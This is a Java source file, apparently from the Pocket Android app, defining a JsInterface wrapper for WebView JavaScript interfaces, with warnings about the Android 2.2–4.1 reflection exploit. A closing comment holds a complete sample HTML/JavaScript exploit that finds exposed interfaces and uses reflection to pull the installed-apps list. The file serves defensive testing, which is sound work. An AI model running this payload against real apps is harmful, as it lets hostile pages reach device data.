package com.pocket.util.android.webkit;

import android.webkit.WebView;

import com.pocket.util.java.Logs;
import com.pocket.util.android.NoObfuscation;

/**
 * A base class for providing better security with JS Interfaces. Can be removed when it isn't needed.
 * <p>
 * <b>IMPORTANT</b>: As with all Javascript Interfaces, it is important to remember that any of these methods will be accessible by any javascript
 * running on the loaded page. With every method you add or modify take a moment to think about what kinds of malicious input could be
 * passed through the parameters, what malicious scripts could do with your input, and also with just calling the method in general.
 * <p>
 * <b>WARNING</b>: There is an Android exploit in versions 2.2 to 4.1.* that allows javascript to access system methods through
 * a javascript interface, even if you aren't exposing methods through your interface. <b>There should never be a javascript interface
 * installed while loading pages with html/javascript that we don't have complete control over</b>. There is a sample/test html file in the comments
 * at the bottom of this class file.
 * <p>
 * Before Api Level 11, reflection is used to remove the interface when you invoke {@link #setEnabled(boolean)} with false.
 * If for some reason the reflection fails, it would be very unexpected, but the interface will not be removed and
 * still be available to javascript.
 * <p>
 * You can use {@link #isEnabled()} to check whether or not it is suppose to be available or not.
 */
public abstract class JsInterface implements NoObfuscation {
	
	private static final boolean LOG = false;
	private static final String TAG = "JSI";
	
	private final WebView mWebView;
	private final String mInterfaceName;
	
	private boolean mIsInstalled = false;
	
	/**
	 * 
	 * @param interfaceName The name that javascript will know this class by.
	 */
	public JsInterface(WebView webview, String interfaceName) {
		mWebView = webview;
		mInterfaceName = interfaceName;
	}
	
	/**
	 * Adds or removes the interface.
	 * 
	 * @param enabled
	 */
	public void setEnabled(boolean enabled) {
		if (mIsInstalled == enabled) {
			return;
		}
		
		if (enabled) {
			if (LOG) Logs.d(TAG, "add interface " + mInterfaceName);
			
			mWebView.addJavascriptInterface(this, mInterfaceName);
			mIsInstalled = true;
			
		} else {
			boolean removed = removeCompat();
			if (removed) {
				mIsInstalled = false;
			}
			
			if (LOG) Logs.d(TAG, "remove interface " + mInterfaceName + " success=" + removed);
		}
	}
	
	/**
	 * Disconnect this javascript interface from the webview. Can be reconnected later.
	 * 
	 * @return If successfully removed
	 */
	private boolean removeCompat() {
		mWebView.removeJavascriptInterface(mInterfaceName);
		return true;
	}
	
	public boolean isEnabled() {
		return mIsInstalled;
	}
	
	/*
	 * Here is an example html file you can load to test what javascript interfaces are installed and which are exploitable.
	 * Parts of this code are taken from an report from a user in support. https://readitlater.desk.com/agent/case/82318
	 * 
	<html>
	<head>
	<script type="text/javascript">
	
	function getJni(interface){
	    return interface.getClass().getClassLoader().loadClass("android.webkit.JniUtil");
	}
	
	function getCtx(interface){
	    var jni = getJni(interface)
		var myfield = jni.getDeclaredField('sContext');
	    myfield.setAccessible(true);
	    return myfield.get(jni);
	}
	
	function getInstalledApps(interface){
	   var ctx = getCtx(interface);
	   var packagemanager = ctx.getPackageManager();
	   return packagemanager.getInstalledApplications(8192);
	}
	
	function isJsInterface(key) {
		var obj = window[key];
		if (!(typeof obj === "object" && obj !== null)) {
			return false;
		}
	
		var str = obj.toString();
	    allObjs = allObjs + key + ":" + str + "<br>";
	    
	    if (str.match(/@\w+/) || beginsWith(key, "AndroidGetter") || beginsWith(key, "PocketAndroid")) {
	        return true;
	    } else {
	    	return false;
	    }
	}
	
	function beginsWith(haystack, needle) {
		haystack = haystack + "";
		return haystack.substring(0, needle.length) == needle;
	}
	
	// Find available interfaces
	var allObjs = "";
	var jsInterfaces = [];
	var i = 0;
	var key;
	for (key in window) {
		if (isJsInterface(key)) {
	    	jsInterfaces.push(key);
	        i++;
	    }
	}
	
	// Print results
	if (jsInterfaces.length > 0) {
		document.write("<br><br>FOUND " + jsInterfaces.length + " INTERFACES:<br>");
		var i;
		for (i in jsInterfaces) {
			key = jsInterfaces[i];
			document.write("<br><br>ATTEMPTING TO EXTRACT INSTALLED APPS WITH INTERFACE " + key + "<br>");
			var apps;
			try {
				apps = getInstalledApps(window[key]);
				document.write("SUCCESS, here is a list of apps: <br>" + apps + "<br>");
				
			} catch(e) { 
				document.write("FAILED with " + e + "<br>");
			}
		}
		
	} else {
		document.write("<br><br>NO INTERFACES FOUND<br>");
	}
	
	document.write("<br><br>WINDOW VARS<br>" + allObjs);
	
	</script>
	</head>
	<body>
	</body>
	</html>
	 */
	
}
